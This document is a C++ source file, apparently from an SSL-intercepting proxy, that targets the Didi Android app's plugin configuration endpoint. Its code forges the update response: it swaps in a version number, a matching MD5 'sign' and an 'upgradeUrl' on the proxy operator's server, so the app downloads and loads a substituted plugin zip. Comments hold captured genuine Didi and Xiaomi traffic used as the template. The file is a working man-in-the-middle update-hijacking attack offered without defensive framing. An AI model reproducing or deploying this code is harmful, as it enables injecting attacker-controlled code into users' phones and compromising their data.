#include "DidiAndroid.h"
#include "../HttpUtils.h"
#include "../cipher/CryptoUtils.h"
#include "PluginServer.h"

int gDidiAndroidFlag = 0;

int DidiAndroid::isDidi(const char * url, const char * host) {
	if (strstr(host, "star.xiaojukeji.com") && strstr(url, "/config/get.node?")) {
		gDidiAndroidFlag = 1;
		return TRUE;
	}

	return FALSE;
}


int DidiAndroid::replyDidi(char * dstbuf, int dstbuflimit, LPSSLPROXYPARAM lpssl) {
	if (gDidiAndroidFlag == 1)
	{
		char * szHttpFormat = "HTTP/1.1 200 OK\r\n"
			"Content-Type: application/json; charset=utf-8\r\n"
			"Content-Length: %u\r\n"
			"Connection: keep-alive\r\n\r\n%s";

		int ret = 0;

		string strip = HttpUtils::getIPstr(gServerIP) + "/" + lpssl->username;

		unsigned char hexmd5[64] = { 0 };
		string zipfn = "didiout.zip";
		string filename = Public::getUserPluginPath(lpssl->username) + zipfn;
		char szmd5[64] = { 0 };
		int filesize2 = CryptoUtils::getUpdateFileMd5(filename, szmd5, hexmd5, 1);

		string ver = "9.0.2";

		char hdrformat[4096];
		char szformat[] = "{\"success\":true,\"data\":{\"china_card_ocr_detect_0620\":{\"version\":\"%s\",\"size\":%u,"
			"\"sign\":\"%s\","
			"\"upgradeUrl\":\"http://%s/%s\"}},\"code\":200}";
		int httphdrlen = sprintf_s(hdrformat, 4096, szformat, ver.c_str(), filesize2, szmd5, strip.c_str(), zipfn.c_str());

		int retlen = sprintf(dstbuf, szHttpFormat, httphdrlen, hdrformat);
		return retlen;
	}else if (gDidiAndroidFlag == 2)
	{
		char * szHttpRespFormat = "HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: application/zip\r\nContent-Length: %u\r\n\r\n";

		string filename = Public::getUserUrl(lpssl->username, "dk.zip");
		int ret = PluginServer::SendPluginFile(filename.c_str(), lpssl, szHttpRespFormat, 1);
		return 0;
	}
	return 0;
}


/*
GET /plugin/mpcd_v9.apk HTTP/1.1
User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.1; HUAWEI TAG-TL00 Build/HUAWEITAG-TL00)
CityId: 5
Flowtag: 780
Host: file.xmpush.xiaomi.com
Connection: Keep-Alive
Accept-Encoding: gzip
didi-header-rid: ac1100075d5fa36700002da1ed66b2f2

HTTP/1.1 404 Not Found
Date: Fri, 23 Aug 2019 08:27:16 GMT
Content-Type: text/html
Content-Length: 4
Connection: keep-alive
ETag: "5c7e35d9-4"
Age: 1
X-Via: 1.1 PSzjjxdx10xa65:1 (Cdn Cache Server V2.0), 1.1 PSzjwzdx10ah73:6 (Cdn Cache Server V2.0), 1.1 PSzjjxdx10jp162:12 (Cdn Cache Server V2.0)

//app_mpcd
*/

//file.xmpush.xiaomi.com/plugin/mpcd_v9.apk
/*
GET /config/get.node?city=-1&name=china_card_ocr_recognize_0620&wsgenv=
eV60A3SNcdtdkexMIXVl2cABAAARQe04P7ky%2BlOAyZ%2FWxdEhb016vEMMVfYV1UliLDSxD6bqPox1o85shLmXtyNZ%2B5naaCPRWQny7qAI6F3WYHDsFP772l1d0oYLilSW%2BKOgwC%2BPHP%2BfOpafIuU7jngERKRzSMwxrBY8eVnrPpxXwcZQ7aNJ%2FCMeFL%2BAhRYADOnvTFqQkLOUlAUu9fovRtrSJSp%2BtTE2bpG0LyQfRUTuzGgpSr8JVCvkQobi%2BEB%2BDT8llLTT%2Buc8vcr%2FB%2FCH4J11%2FpqiuXaYdzTUGdCIXOpeteUY1GcBR%2FHzqDvXcHTbfxW9%2B51qC%2FYYlYLbL3MyrqS%2FNTdDmu7NJOENRjJI3ss97QIA0RyOrcLnNTJvLZm9yxcH8fHBR31B0KDn7SaeHM%2B029l4LDQOOLyq2jBtjt%2Ft%2BLBT HTTP/1.1
didi-header-hint-content: {"app_timeout_ms":20000,"Cityid":-1,"lang":"zh-CN","utc_offset":"480"}
TripCountry: null
didi-header-omgid: KhnA33tkTaadimK2qCSmaw
didi-header-ssuuid: 27A1AFE8165AA13DEAB1EED34401AE9F_108978
didi-header-rid: 2aef8d895d5f91d400001e3350301b4f
ticket: none
User-Agent: Android/9 didihttp OneNet/2.1.0.90 com.sdu.didi.psnger/5.3.2
Host: star.xiaojukeji.com
Connection: Keep-Alive
Accept-Encoding: gzip
wsgsig: dd04-+KGF2L40fL/+ALVzqAX2j2zYyOEx3xe9eV+La4ZuPm7f4pi0x1c0u+jwAIpr1+QnsCRunyqlA3pEaMz94fDWXCISyTEnetGg5mOuVC6l0nXQe/npygjlPgKTBPtFZTTeN1LFlrtt4nju49f+vsRYn8/RAJDp2+t+YikAOiAQ3PzZ4909wsqSOp/n5Jdjepn4xFOqO+EO3IUk

HTTP/1.1 200 OK
Server: router/2.8.0
Date: Fri, 23 Aug 2019 07:12:21 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 207
Connection: keep-alive
X-Powered-By: Express
ETag: W/"cf-6437bf80"
Vary: Accept-Encoding
Access-Control-Allow-Origin: *

{"success":true,"data":{"china_card_ocr_detect_0620":{"version":"1.0.2","size":1018358,"sign":"5b1d1e4474d5e352e8252308bd39481c",
"upgradeUrl":"https://starfile.xiaojukeji.com/1560997585464.zip"}},"code":200}
*/